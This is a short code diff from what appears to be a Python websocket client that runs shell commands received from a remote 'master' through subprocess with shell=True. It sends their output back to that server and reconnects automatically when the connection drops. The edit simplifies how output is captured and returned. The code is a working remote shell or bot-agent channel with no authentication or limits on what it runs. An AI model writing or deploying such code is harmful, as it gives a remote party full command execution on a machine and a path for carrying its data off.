@@ -36,16 +36,12 @@ async def connect_to_websocket(url, room, retry_interval):
 
                         result = subprocess.run(message_from_master, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
-                        if result.returncode == 0:
-                            print(f"Command executed successfully. Output saved to {output_filename}")
-                            with open(output_filename) as output_file:
-                                await websocket.send(output_file.read())
-                        else:
-                            with open(output_filename, "w") as output_file:
-                                output_file.write(result.stdout)
-                                output_file.write(result.stderr)
-                            with open(output_filename, "r") as output_file:
-                                await websocket.send(output_file.read())
+                        with open(output_filename, "w") as output_file:
+                            output_file.write(result.stdout)
+                            output_file.write(result.stderr)
+
+                        with open(output_filename, "r") as output_file:
+                            await websocket.send(output_file.read())
 
         except websockets.exceptions.ConnectionClosed:
             print(f"Connection closed. Reconnecting in {retry_interval} seconds...")
